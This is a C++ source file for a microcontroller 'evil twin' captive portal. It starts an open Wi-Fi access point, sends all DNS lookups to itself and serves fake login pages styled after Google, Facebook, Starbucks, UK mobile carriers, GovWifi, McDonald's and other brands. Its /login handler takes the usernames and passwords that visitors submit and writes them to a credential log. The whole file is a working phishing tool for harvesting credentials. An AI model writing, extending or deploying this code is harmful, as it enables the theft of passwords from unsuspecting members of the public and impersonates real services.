#include "captive_portal.h"
#include <WiFi.h>
#include <SD.h>
#include "logger.h"
#include "portal_html.h"

CaptivePortal::CaptivePortal() : server(80) {}

void CaptivePortal::begin(const char* ssid, PortalTemplate selectedTemplate, String customPath) {
    currentTemplate = selectedTemplate;
    sdPath = customPath;
    WiFi.mode(WIFI_AP);
    WiFi.softAP(ssid);
    
    IPAddress apIP = WiFi.softAPIP();
    Logger::log("AP Started. SSID: " + String(ssid));
    Logger::log("AP IP: " + apIP.toString());
    if (sdPath != "") {
        Logger::log("Template: SD Card (" + sdPath + ")");
    } else {
        Logger::log("Template: " + String(TEMPLATE_NAMES[currentTemplate]));
    }

    dnsServer.start(DNS_PORT, "*", apIP);
    
    setupRoutes();
    server.begin();
    running = true;
}

void CaptivePortal::update() {
    if (running) {
        dnsServer.processNextRequest();
    }
}

void CaptivePortal::stop() {
    server.end();
    dnsServer.stop();
    WiFi.softAPdisconnect(true);
    running = false;
}

void CaptivePortal::setupRoutes() {
    // Captive Portal Detection
    server.on("/generate_204", HTTP_GET, [](AsyncWebServerRequest *request){
        request->redirect("/");
    });
    server.on("/fwlink", HTTP_GET, [](AsyncWebServerRequest *request){
        request->redirect("/");
    });

    // Main Portal Page
    server.on("/", HTTP_GET, [this](AsyncWebServerRequest *request){
        if (sdPath != "") {
            if (SD.exists(sdPath)) {
                request->send(SD, sdPath, "text/html");
                return;
            }
        }
        
        const uint8_t* html_gz = GENERIC_HTML_GZ;
        uint32_t html_gz_len = GENERIC_HTML_GZ_LEN;
        
        switch(currentTemplate) {
            case TEMPLATE_GOOGLE: html_gz = GOOGLE_HTML_GZ; html_gz_len = GOOGLE_HTML_GZ_LEN; break;
            case TEMPLATE_FACEBOOK: html_gz = FACEBOOK_HTML_GZ; html_gz_len = FACEBOOK_HTML_GZ_LEN; break;
            case TEMPLATE_STARBUCKS: html_gz = STARBUCKS_HTML_GZ; html_gz_len = STARBUCKS_HTML_GZ_LEN; break;
            case TEMPLATE_BT_WIFI: html_gz = BT_WIFI_HTML_GZ; html_gz_len = BT_WIFI_HTML_GZ_LEN; break;
            case TEMPLATE_O2_WIFI: html_gz = O2_WIFI_HTML_GZ; html_gz_len = O2_WIFI_HTML_GZ_LEN; break;
            case TEMPLATE_SKY_WIFI: html_gz = SKY_WIFI_HTML_GZ; html_gz_len = SKY_WIFI_HTML_GZ_LEN; break;
            case TEMPLATE_EE_WIFI: html_gz = EE_WIFI_HTML_GZ; html_gz_len = EE_WIFI_HTML_GZ_LEN; break;
            case TEMPLATE_TESCO_WIFI: html_gz = TESCO_WIFI_HTML_GZ; html_gz_len = TESCO_WIFI_HTML_GZ_LEN; break;
            case TEMPLATE_VIRGIN_WIFI: html_gz = VIRGIN_WIFI_HTML_GZ; html_gz_len = VIRGIN_WIFI_HTML_GZ_LEN; break;
            case TEMPLATE_THE_CLOUD: html_gz = THE_CLOUD_HTML_GZ; html_gz_len = THE_CLOUD_HTML_GZ_LEN; break;
            case TEMPLATE_GOV_WIFI: html_gz = GOV_WIFI_HTML_GZ; html_gz_len = GOV_WIFI_HTML_GZ_LEN; break;
            case TEMPLATE_GOVROAM: html_gz = GOVROAM_HTML_GZ; html_gz_len = GOVROAM_HTML_GZ_LEN; break;
            case TEMPLATE_MCDONALDS: html_gz = MCDONALDS_HTML_GZ; html_gz_len = MCDONALDS_HTML_GZ_LEN; break;
            case TEMPLATE_COSTA: html_gz = COSTA_HTML_GZ; html_gz_len = COSTA_HTML_GZ_LEN; break;
            case TEMPLATE_GREGGS: html_gz = GREGGS_HTML_GZ; html_gz_len = GREGGS_HTML_GZ_LEN; break;
            case TEMPLATE_WESTFIELD: html_gz = WESTFIELD_HTML_GZ; html_gz_len = WESTFIELD_HTML_GZ_LEN; break;
            case TEMPLATE_TRAIN_WIFI: html_gz = TRAIN_WIFI_HTML_GZ; html_gz_len = TRAIN_WIFI_HTML_GZ_LEN; break;
            case TEMPLATE_AIRPORT_WIFI: html_gz = AIRPORT_WIFI_HTML_GZ; html_gz_len = AIRPORT_WIFI_HTML_GZ_LEN; break;
            case TEMPLATE_MOTO_WIFI: html_gz = MOTO_WIFI_HTML_GZ; html_gz_len = MOTO_WIFI_HTML_GZ_LEN; break;
            default: html_gz = GENERIC_HTML_GZ; html_gz_len = GENERIC_HTML_GZ_LEN; break;
        }
        
        AsyncWebServerResponse *response = request->beginResponse_P(200, "text/html", html_gz, html_gz_len);
        response->addHeader("Content-Encoding", "gzip");
        request->send(response);
    });

    // Handle Login
    server.on("/login", HTTP_POST, [](AsyncWebServerRequest *request){
        String user = "";
        String pass = "";
        if (request->hasParam("user", true)) user = request->getParam("user", true)->value();
        if (request->hasParam("pass", true)) pass = request->getParam("pass", true)->value();
        
        Logger::log_credential(user, pass);
        
        AsyncWebServerResponse *response = request->beginResponse_P(200, "text/html", SUCCESS_HTML_GZ, SUCCESS_HTML_GZ_LEN);
        response->addHeader("Content-Encoding", "gzip");
        request->send(response);
    });

    // 404 Redirect to Portal
    server.onNotFound([](AsyncWebServerRequest *request){
        request->redirect("/");
    });
}
